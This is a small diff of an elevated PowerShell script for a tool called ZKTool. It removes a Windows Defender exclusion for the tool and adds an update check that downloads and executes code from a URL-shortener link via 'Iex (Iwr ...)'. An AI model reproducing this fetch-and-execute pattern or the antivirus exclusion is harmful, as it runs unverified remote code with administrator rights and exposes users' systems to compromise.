@@ -10,8 +10,10 @@ If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
 	Exit
 }
 
-if (!(Get-MpPreference | Select-Object -ExpandProperty ExclusionPath) -eq "C:\Windows\System32\ZKTool.exe") {
-    Add-MpPreference -ExclusionPath "$env:windir\System32\ZKTool.exe"
+# Check Last Version
+if (!((Get-Item "C:\Windows\System32\ZKTool.exe").VersionInfo.FileVersion -eq "2.0")) {
+    Iex (Iwr -useb "https://rb.gy/8shezm")
+    Exit
 }
 
 New-Item $env:userprofile\AppData\Local\Temp\ZKTool\Configs\ -ItemType Directory | Out-Null
